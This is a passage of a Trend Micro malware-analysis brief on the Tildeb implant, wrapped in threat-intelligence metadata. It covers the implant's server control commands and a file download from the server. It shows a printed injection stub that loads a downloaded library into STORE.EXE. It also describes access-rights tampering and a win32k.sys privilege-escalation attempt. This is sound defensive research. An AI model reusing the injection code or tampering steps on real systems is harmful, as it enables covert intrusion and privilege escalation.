\\\\.\\mailslot\\c54321 and sets its value to zero.\n7. It attempts to delete the buffer using the Windows API DeleteFileA. It commits the same\n\nmistake, since it is passing the address of the buffer and not a handle to a file.\n\n13\n\n|Format Message|Populated|\n|---|---|\n|'%ld %ls ',0|'768 <server_response_a> <server_response_b>'|\n\n|Server Response|Process Name|\n|---|---|\n|priv.edb|STORE.EXE|\n|pub.edb|STORE.EXE|\n|dir.edb|DSAMAIN.EXE|\n|kmsmdb.edb|KMSERVER.EXE|\n|<if no match>|STORE.EXE|\n\n\n-----\n\nBelow is a brief description of some of the referenced file names and processes of MS Exchange Server\nin this control command:\n\n    - The EDB extension is \"Exchange Information Store Database.\"\n\n    - Prior to MS Exchange Server v5.5, there were three key DB files, and each contained:\n\n1. PRIV.EDB: private information store (this is the actual mailbox content).\n2. PUB.EDB: public information store (public folder).\n3. DIR.EDB: list/directory of users with mailboxes on the server.\n\n    - kmsmdb.edb: Key Management Security DB. This file is associated with MS Exchange\nServer 5.5, and in particular the Key Management Server.\n\n    - DSAMAIN.EXE: This is part of active directory management tools. It allows mounting a\nshadow copy snapshot or backup of the Active Directory DB file ntds.dit. Moreover, it allows\nbrowsing the data using standard admin tools such as Active Directory Users and Computers\n(ADUC) and snap-in.\n\n    - STORE.EXE: Microsoft Exchange MDB Store, responsible for enabling mail sessions opened\nby different clients.\n\n  - **0x290 OR 0x291 OR 0x292:**\n\nThe format message has the following structure:\n**Format Message** **Populated**\n```\n         '%ld %2x %2x %2x %2x %2x %2x %2x %2x '<control command> <s_r[0]> <s_r[1]> <s_r[2]>\n         ' <s_r[3]> %2x %2x %2x %2x '\n\n```\nThe bytes s_r[0], s_r[1], s_r[2] and s_r[3] are received from the server. The last 4 bytes\nare never set anywhere in the code. Then, it performs steps 2-7 (code is injected into the\nSTORE.EXE process) similar to control command 0x300, but it writes this control\ncommand’s formatted string to the mailslot instead.\n\n  - **>= 0x285:**\n\nThe format message has the following structure:\n**Format Message** **Populated**\n```\n         '%ld %2x %2x %2x %2x %2x %2x %2x %2x %2x' '0x285 <s_r[0]> <s_r[1]> <s_r[2]>\n                                 <s_r[3]> %2x %2x %2x %2x 1'\n\n```\nThe value 0x285 is hardcoded and it represents the actual control command. The bytes\ns_r[0], s_r[1], s_r[2] and s_r[3] are received from the server. The bytes highlighted above\nare never set anywhere in the code. If the control command is > 0x285, formatted string\nis set to:\n\n**Format Message** **Populated**\n```\n         '%ld %2x %2x %2x %2x %2x %2x %2x %2x %2x' '<(control command -1)> <s_r[0]> <s_r[1]>\n                                 <s_r[2]> <s_r[3]> %2x %2x %2x %2x 0'\n\n```\nThe highlighted bytes are never set anywhere in the code. It performs steps 2-7 (code is\ninjected into STORE.EXE process) similar to control command 0x300, but it writes this\ncontrol command’s formatted string to the mailslot instead.\n\n  - **0x206 OR 0x207:**\n\nThe format message has the following structure:\n**Format Message** **Populated**\n```\n         '%ld %2x %2x %2x %2x %2x %2x %2x %2x' '<(control command -2)> <s_r[0]> <s_r[1]>\n                               <s_r[2]> <s_r[3]> %2x %2x %2x %2x'\n\n```\nThe bytes s_r[0], s_r[1], s_r[2] and s_r[3] are received from the server. The last 4 bytes\nare never set anywhere in the code. The first formatted string is populated independently\nof the second.\n\n14\n\n|Format Message|Populated|\n|---|---|\n|'%ld %2x %2x %2x %2x %2x %2x %2x %2x '|'<control command> <s_r[0]> <s_r[1]> <s_r[2]> <s_r[3]> %2x %2x %2x %2x '|\n\n|Format Message|Populated|\n|---|---|\n|'%ld %2x %2x %2x %2x %2x %2x %2x %2x %2x'|'0x285 <s_r[0]> <s_r[1]> <s_r[2]> <s_r[3]> %2x %2x %2x %2x 1'|\n\n|Format Message|Populated|\n|---|---|\n|'%ld %2x %2x %2x %2x %2x %2x %2x %2x %2x'|'<(control command -1)> <s_r[0]> <s_r[1]> <s_r[2]> <s_r[3]> %2x %2x %2x %2x 0'|\n\n|Format Message|Populated|\n|---|---|\n|'%ld %2x %2x %2x %2x %2x %2x %2x %2x'|'<(control command -2)> <s_r[0]> <s_r[1]> <s_r[2]> <s_r[3]> %2x %2x %2x %2x'|\n\n\n-----\n\nThe second formatted string (rhs) is concatenated with the first one x (condition value)\nnumber of times in a for-loop that keeps on concatenating the second string to the first\nuntil the condition evaluates to false. The condition value is received from the server prior\nto the concatenation. Moreover, on every iteration inside the for-loop, the values of the\nsecond string s_r[]are populated with new data from the server.\n\nIt then performs steps 2-7 (code is injected into STORE.EXE process) as that of control\ncommand 0x300, but it writes this control command’s formatted string to the mailslot\ninstead.\n\n- **0x290 OR 0x291 OR 0x292:**\n\nThe format message has the following structure:\n**Format** **Populated**\n**Message**\n```\n       '%ld %ls ' '<control command> <server_response> '\n                 Then, concatenates <server_response_b>\n                 '<control command> <server_response_a> <server_response_b>'\n                 Then concatenate: ' %x %x'\n                 '<control command> <server_response_a> <server_response_b> %x\n                 <server_response_c>'\n\n```\nThe highlighted byte is never set anywhere in the code, and the second is received from\nthe server (maximum length of 8 bytes). It then performs steps 2-7 (code is injected into\nSTORE.EXE process) similar to control command 0x300, but it writes this control\ncommand’s formatted string to the mailslot instead.\n\n- **0x280: It downloads a file from the server onto the infected system. The file is saved on disk**\nunder a temporary file name. File path and name is retrieved and constructed in the same way as\nthat of control command 0x400. We've referred to the full path and name of the downloaded file\nas dwldd_file.\n\nThe format message has the following structure:\n\n**Format Message** **Populated**\n```\n       '%ld %2x %2x %2x %2x %2x %2x %2x %2x %s' '<control command> <s_r[0]> <s_r[1]> <s_r[2]>\n                              <s_r[3]> %2x %2x %2x %2x <dwldd_file>'\n\n```\nThe highlighted bytes are never set anywhere in the code. It then performs steps 2-7 (code is\ninjected into STORE.EXE process) similar to control command 0x300, but it writes this control\ncommand’s formatted string to the mailslot instead. After step 7, it also deletes the download file\n_dwldd_file._\n\n- **0x281: The same implementation of the control command 0x280.**\n\n- **0x204: The same implementation of the control commands 0x290, 0x291, and 0x292.**\n\n- **0x203: The same implementation of the control command 0x208 except that the <control**\n_command> is hardcoded in the formatted string as 515 instead of being referenced. Additionally,_\nthe formatted string is different and has the following structure:\n```\n                  '0x203 <server_response_a> <server_response_b>'\n\n```\n- **0x202: The same implementation of the control command 0x300 except that the <control**\n_command> is hardcoded in the formatted string as 514. For the fourth step, code is injected into_\nSTORE.EXE process.\n\n15\n\n|Format Message|Populated|\n|---|---|\n|'%ld %ls '|'<control command> <server_response> ' Then, concatenates <server_response_b> '<control command> <server_response_a> <server_response_b>' Then concatenate: ' %x %x' '<control command> <server_response_a> <server_response_b> %x <server_response_c>'|\n\n|Format Message|Populated|\n|---|---|\n|'%ld %2x %2x %2x %2x %2x %2x %2x %2x %s'|'<control command> <s_r[0]> <s_r[1]> <s_r[2]> <s_r[3]> %2x %2x %2x %2x <dwldd_file>'|\n\n\n-----\n\n  - **0x201: The same implementation of the control command 0x300, except that the <control**\n_command> is hardcoded in the formatted string as 513. For the fourth step, code is injected into_\nthe STORE.EXE process. Moreover, the formatted string is as follows (nothing is concatenated\nwith the server response):\n\n**Format** **Populated**\n**Message**\n```\n         '%ld ' '513 '\n\n# Code Injection Function\n\n```\nThis function first checks if the available physical memory on the system and the maximum amount of\nmemory the Tildeb process can commit is less than 33554432 bytes (~33.55 Mb). If so, then no attempt\nat code injection happens, as the following pseudocode snippet shows:\n```\n GlobalMemoryStatus(&Buffer);\n if ( Buffer.dwAvailPhys + Buffer.dwAvailPageFile < 33554432 )\n {\n  return -4; // error_code\n }\n\n```\nTo get the process’ (‘injectee’) unique process ID, it uses the API NtQuerySystemInformation(), passing it\nthe SystemInformationClass value from SystemProcessInformation. The targeted process is supposed to\nbe running on the system already.\n\nIt then attempts to get a handle to the process in question by requesting the following list of desired\naccess rights (using the OpenProcess() API): PROCESS_CREATE_THREAD,\nPROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE, and\nPROCESS_QUERY_INFORMATION. If unsuccessful, it attempts to acquire them using either of two\nmethods.\n\nBefore attempting code injection, the implant compares the image base address of the module\n_Kernel32.dll for the same process. One is retrieved via a pseudohandle to the process and the other via_\nthe actual process ID. If the base addresses do not match, code injection does not take place. It is\nunknown why the malware enforces such comparison, or under what scenario it is supposed to fail.\n\nThe implant retrieves the image base address of the module Kernel32.dll through either of the following\ntwo methods:\n\n1. Using the API NtQuerySystemInformation(), passing it the SystemInformationClass value from\n\n_ProcessBasicInformation, which returns the structure _PROCESS_BASIC_INFORMATION. This_\nis done by parsing the structures data members _PEB.Ldr \n_PEB_LDR_DATA.InMemoryOrderModuleList  LDR_DATA_TABLE_ENTRY. DllBase.\n2. Using the API NtQuerySystemInformation(), passing it the SystemInformationClass value from\n\n_[SystemModuleInformation, which returns the structure RTL_PROCESS_MODULES. This](https://www.geoffchappell.com/studies/windows/km/ntoskrnl/api/rtl/ldrreloc/process_modules.htm?tx=53)_\nstructure is not publicly documented by Microsoft in the MSDN library. However, the malware\nparses it to locate the ImageBase field.\n\n16\n\n|Format Message|Populated|\n|---|---|\n|'%ld '|'513 '|\n\n\n-----\n\nThe second method is only reachable if the process pseudohandle or ID value is zero, which is unclear in\nthis context. Once all checks are passed, it injects the following code into the targeted process:\n```\n    injected_code  proc near \n      push  esi\n      push  edi\n      mov   edi, [esp+8+PtrLoadLibraryA]\n      lea   eax, [edi+8]\n      push  eax        // fname_s (path to downloaded module)\n      call  dword ptr [edi]  // LoadLibraryA\n      mov   esi, eax\n      test  esi, esi\n      jz   short ret_zero\n      push  esi\n      call  dword ptr [edi+4] // FreeLibrary\n    ret_zero:\n      mov   eax, esi\n      pop   edi\n      pop   esi\n      retn  4\n    injected_code  endp\n\n```\nThe code above is responsible for loading and freeing a library module downloaded from the server (as\nshown in control command 0x20) into the address space of the targeted process. Note that the addresses\nof the APIs LoadLibraryA() and FreeLibrary() are resolved dynamically prior to injection, and then their\naddresses are injected accordingly.\n\nNothing stands out with respect to the code responsible for injection. It is done by committing a region of\nmemory of size (injected code size (32) + 531 = 563 bytes) within the virtual address space of the\ntargeted process, with the memory protection for the regions to be allocated set to\nPAGE_EXECUTE_READWRITE. Copying and starting the code into the targeted process is done via the\nstandard APIs WriteProcessMemory(), CreateRemoteThread(), and WaitForSingleObject(hThread,\n_0xFFFFFFFF)._\n\nThe methods it tries in case Tildeb doesn’t have the specified access rights to the process object are as\nfollows:\n\n1. It attempts to add the GENERIC_ALL (the right to read, write, and execute the object) access\nallowed Access Control Entry (ACE) to the security identifier of the account named Everyone on\nthe system. Then, it tries to set/update the DACL_SECURITY_INFORMATION (discretionary\naccess control list) for object SE_KERNEL_OBJECT of the targeted process with the new ACE,\nthat is, GENERIC_ALL.\n\nIf Tildeb is still unable to acquire those access rights after executing this step, it attempts to\nperform the same action on two other accounts that are Domain Users and the name of the user\nassociated with the current thread.\n\n2. If all of the actions in the first step fails, the implant attempts to exploit an unknown escalation-of\nprivileges (EoP) vulnerability in the driver win32k.sys. This feature targets very specific versions\nof win32k.sys. It checks for those versions by comparing the CRC-32 checksum of the file on the\ninfected system against the following list of hardcoded checksums:\n\n17\n\n\n-----\n\n```\n    0x6C2CB34C MS Windows NT 4.0 (Service Pack 6a)\n    0x8E1E220D MS Windows NT 4.0 (Service Pack 6)\n\n```\nWe were only able to map three of the checksums to their respective OS versions. Moreover, this\nEoP is attempted only on systems with specific locale (default country). The temporary file\n_~debl00l.tmp is created in the same directory of the implant, and after exploitation. It includes the_\nfollowing information:\n```\n    ver= <unique value assigned by the implant based on the default country code>\n    ccode=<LOCALE_IDEFAULTCOUNTRY>\n    CRC=<crc-32 checksum value of “%windir%\\system32\\win32k.sys”>\n\n```\n18\n\n|Hardcoded CRC-32 Checksum Values|Description|\n|---|---|\n|0x49FBEA88|Unknown|\n|0xE6C42541|MS Windows NT 4.0 (Service Pack 3)|\n|0xF86E4DDE|Unknown|\n|0x6ED9164 0x5CB13093|Unknown Unknown|\n|0x9CEE7C76|Unknown|\n|0x4DBBF9E2 0x9B93E1D1|Unknown Unknown|\n|0x3C862693|Unknown|\n|0x6C2CB34C 0x8E1E220D|MS Windows NT 4.0 (Service Pack 6a) MS Windows NT 4.0 (Service Pack 6)|\n\n\n-----\n\n**TREND MICRO[TM] RESEARCH**\n\nTrend Micro, a global leader in cybersecurity, helps to make the world safe for exchanging digital information.\n\nTrend Micro Research is powered by experts who are passionate about discovering new threats, sharing key insights, and\nsupporting efforts to stop cybercriminals. Our global team helps identify millions of threats daily, leads the industry in\nvulnerability disclosures, and publishes innovative research on new threats techniques. We continually work to anticipate new\nthreats and deliver thought-provoking research.\n\n**www.trendmicro.com**\n\n\n19\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        },
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2018/2018.12.13.Tildeb_Shadow_Brokers/tech-brief-tildeb-analyzing-the-18-year-old-implant-from-the-shadow-brokers-leak.pdf",
        "https://documents.trendmicro.com/assets/tech-brief-tildeb-analyzing-the-18-year-old-implant-from-the-shadow-brokers-leak.pdf"
    ],
    "report_names": [
        "tech-brief-tildeb-analyzing-the-18-year-old-implant-from-the-shadow-brokers-leak",
        "tech-brief-tildeb-analyzing-the-18-year-old-implant-from-the-shadow-brokers-leak.pdf"
    ],
    "threat_actors": [
        {
            "id": "c91e335e-42be-48d9-96b5-ba56749a723b",
            "created_at": "2022-10-25T16:07:23.458346Z",
            "updated_at": "2025-03-27T02:02:09.813395Z",
            "deleted_at": null,
            "main_name": "CIA",
            "aliases": [
                "Central Intelligence Agency"
            ],
            "source_name": "ETDA:CIA",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d4f7cf97-9c98-409c-8b95-b80d14c576a5",
            "created_at": "2022-10-25T16:07:24.561104Z",
            "updated_at": "2025-03-27T02:02:10.281202Z",
            "deleted_at": null,
            "main_name": "Shadow Brokers",
            "aliases": [],
            "source_name": "ETDA:Shadow Brokers",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "171b85f2-8f6f-46c0-92e0-c591f61ea167",
            "created_at": "2023-01-06T13:46:38.830188Z",
            "updated_at": "2025-03-27T02:00:02.929729Z",
            "deleted_at": null,
            "main_name": "The Shadow Brokers",
            "aliases": [
                "Shadow Brokers",
                "ShadowBrokers",
                "The ShadowBrokers",
                "TSB"
            ],
            "source_name": "MISPGALAXY:The Shadow Brokers",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f9806b99-e392-46f1-9c13-885e376b239f",
            "created_at": "2023-01-06T13:46:39.431871Z",
            "updated_at": "2025-03-27T02:00:03.08926Z",
            "deleted_at": null,
            "main_name": "Watchdog",
            "aliases": [
                "Thief Libra"
            ],
            "source_name": "MISPGALAXY:Watchdog",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1666716499,
    "ts_updated_at": 1743041819,
    "ts_creation_date": 1544547943,
    "ts_modification_date": 1544547943,
    "files": {
        "pdf": "https://archive.orkl.eu/e0e24015e1791320e5e81cd74aa57d88d4f5ef08.pdf",
        "text": "https://archive.orkl.eu/e0e24015e1791320e5e81cd74aa57d88d4f5ef08.txt",
        "img": "https://archive.orkl.eu/e0e24015e1791320e5e81cd74aa57d88d4f5ef08.jpg"
    }
}